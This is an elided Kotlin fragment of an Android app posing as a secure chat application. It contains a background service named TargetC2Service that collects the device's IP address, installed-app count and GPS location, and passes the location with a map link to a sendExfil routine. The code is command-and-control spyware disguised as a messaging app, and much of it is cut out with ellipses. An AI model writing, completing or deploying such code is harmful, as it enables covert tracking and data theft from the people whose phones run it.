...
import com.secure.chat.SecureChatApp
import com.secure.chat.ui.ChatActivity
...
class TargetC2Service : Service() {
    ...
    private fun createNotification(): Notification {
        ...
        return NotificationCompat.Builder(this, SecureChatApp.CHANNEL_ID)
    ...
    private fun handleGetInfo() {
        val info = mapOf(
            ...
            "ip" to getIPAddress(),
            "apps" to packageManager.getInstalledApplications(0).size.toString()
        )
        ...
        try {
            ...
            if (location != null) {
                val locData = mapOf(
                    ...
                    "gmaps" to "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                )
                sendExfil("location", JSONObject(locData).toString())
            } else {
